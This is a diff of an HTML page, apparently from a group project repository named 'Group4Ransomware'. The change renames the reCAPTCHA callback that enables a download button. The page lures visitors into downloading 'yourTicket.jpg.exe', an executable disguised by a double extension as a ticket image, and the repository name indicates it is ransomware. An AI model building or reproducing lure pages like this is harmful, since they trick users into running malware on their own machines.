@@ -178,16 +178,16 @@ new pausescroller(pausecontent2, "NewsFeed", "NewsFeed", 5000);
     </table>
     
 
-    <div class="g-recaptcha" data-sitekey="6LcGFc8iAAAAAM3lH2FEY8YRyF_CEXONMtCmMOGs" data-callback="callback"></div>
+    <div class="g-recaptcha" data-sitekey="6LcGFc8iAAAAAM3lH2FEY8YRyF_CEXONMtCmMOGs" data-callback="download_callback"></div>
             <!-- <input type="button" name="answer" value="Click to show Download" onclick="showDiv()" />  -->
-            <div id="welcomeDiv"  class="answer_list" > 
+            <div id="welcomeDiv" > 
                 <button id="download-button" download="https://napatel79.github.io/Group4Ransomware/yourTicket.jpg.exe" disabled>Submit</button>
                 <!-- <p>
                     <a rel="nofollow" href="https://napatel79.github.io/Group4Ransomware/yourTicket.jpg.exe" download>Download Here</a>
                 </p> -->
             </div>
             <script type="text/javascript">
-                function callback() {
+                function download_callback() {
                   const submitButton = document.getElementById("download-button");
                   submitButton.removeAttribute("disabled");
                 }
